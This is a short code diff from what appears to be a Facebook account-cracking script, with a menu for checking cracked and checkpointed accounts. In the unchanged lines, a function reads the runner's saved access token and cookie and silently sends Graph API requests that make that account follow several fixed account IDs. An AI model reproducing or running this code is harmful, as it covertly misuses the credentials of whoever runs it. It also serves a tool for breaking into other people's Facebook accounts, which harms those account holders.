@@ -257,6 +257,7 @@ def ___fii___Sayang___Kamu___Widiya___():
     try:
         token = open('login/token.json', 'r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
+        menu()
         requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + (token),cookies=cookie)
         requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + (token),cookies=cookie)
         requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + (token),cookies=cookie)
@@ -312,7 +313,7 @@ def menu():
     print(f"{P}[5] Ganti user-agent")
     print(f"{P}[6] Chek results crack")
     print(f"{P}[7] Chek opsi account chekpoint")
-    jalan(f"{M}[0] Log Out ")
+    print(f"{M}[0] Log Out ")
     print(f"{B} | ")
     pp = input(f"{P}[*] Pilih Yang Mana : {B}")
     if pp in ["1","01"]:
